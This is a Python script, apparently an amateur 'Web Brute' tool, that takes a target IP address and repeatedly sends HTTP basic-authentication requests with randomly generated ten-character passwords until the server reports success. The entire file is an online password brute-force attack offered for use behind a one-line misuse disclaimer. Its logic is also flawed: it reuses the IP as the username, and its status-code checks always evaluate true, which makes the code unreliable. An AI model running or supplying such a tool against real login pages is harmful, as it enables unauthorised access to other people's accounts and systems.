import random 
from sys import argv
from lib import ascii_struct as at
from lib import requests
import time

def banner():
    version = "\nversion: 0.0.1alpha"
    print ("\n __      __      ___.     __________                __          \n/  \    /  \ ____\_ |__   \______   \_______ __ ___/  |_  ____  \n\   \/\/   // __ \| __ \   |    |  _/\_  __ \  |  \   __\/ __ \ \n \        /\  ___/| \_\ \  |    |   \ |  | \/  |  /|  | \  ___/ \n  \__/\  /  \___  >___  /  |______  / |__|  |____/ |__|  \___  >\n       \/       \/    \/          \/                         \/ ")
    print("CPU OR GPU Based Brute Force Tools")
    print("please do not misuse this tools i do not take responsible and the tools only for security")
    print(version)
    print("\nreport any error in my issue github page")


banner()

username = input("put the IP address page here (ex: 168.989.22): ")
sta = at.ASCII_struct
IP = "http://" + username + "/"

class usermain():
    data = input("\nHow many you want try to brute force the page? (ex: 30): ")
    intdata = int(data)

class argument_syntax():
    arg1 = "--help"
    arg2 = "--gcp"               

def gpcft():
    for i in range(usermain.intdata):
        i = i + 1

        ASCII = sta.ASCII_tuple
        SYMBOL = sta.ASCII_symbol

        f1 = ASCII[random.randrange(0, 9)]
        s1 = SYMBOL[random.randrange(0, 31)]
    
        f2 = ASCII[random.randrange(0, 9)]
        s2 = SYMBOL[random.randrange(0, 31)]

        f3 = ASCII[random.randrange(0, 9)]
        s3 = SYMBOL[random.randrange(0, 31)]

        f4 = ASCII[random.randrange(0, 9)]
        s4 = SYMBOL[random.randrange(0, 31)]

        f5 = ASCII[random.randrange(0, 9)]
        s5 = SYMBOL[random.randrange(0, 31)]

        f6 = ASCII[random.randrange(0, 9)]
        s6 = SYMBOL[random.randrange(0, 31)]

        f7 = ASCII[random.randrange(0, 9)]
        s7 = SYMBOL[random.randrange(0, 31)]

        f8 = ASCII[random.randrange(0, 9)]
        s8 = SYMBOL[random.randrange(0, 31)]

        f9 = ASCII[random.randrange(0, 9)]
        s9 = SYMBOL[random.randrange(0, 31)]

        f10 = ASCII[random.randrange(0, 9)]
        s10 = SYMBOL[random.randrange(0, 31)]

        combination_1_digit = (
                f1,
                s1
            )

        combination_2_digit = (
                f2,
                s2
            )

        combination_3_digit = (
                f3,
                s3
        )

        combination_4_digit = (
                f4,
                s4
        )

        combination_5_digit = (
                f5,
                s5
        )

        combination_6_digit = (
                f6,
                s6
        )

        combination_7_digit = (
                f7,
                s7
        )

        combination_8_digit = (
                f8,
                s8
        )

        combination_9_digit = (
                f9,
                s9
        )

        combination_10_digit = (
                f10,
                s10
        )

        global wordlist

        wordlist = random.choice(combination_1_digit) + random.choice(combination_2_digit) + random.choice(combination_3_digit) + random.choice(combination_4_digit) + random.choice(combination_5_digit) + random.choice(combination_6_digit) + random.choice(combination_7_digit) + random.choice(combination_8_digit) + random.choice(combination_9_digit) + random.choice(combination_10_digit)

        print("Targeted page:", IP)
        time.sleep(1)
        print("\n" + wordlist, "<=== [Password Attempt for]:", i)
        req = requests.get(IP, auth=(username, wordlist))
        check = req.status_code
        auth_info = req.json()

        if auth_info['authenticated'] == True:
            print("password is:", wordlist)
            break
        else:
            print("[password incorrect]")

        if check == 200:
            print("\n[Connection Stable]")
        elif (check == 400 or 499):
            print("\n[Connection Failed]")
        elif (check == 500 or 599):
            print("\nSending Data Failed")


def main():
    gpcft()

main()
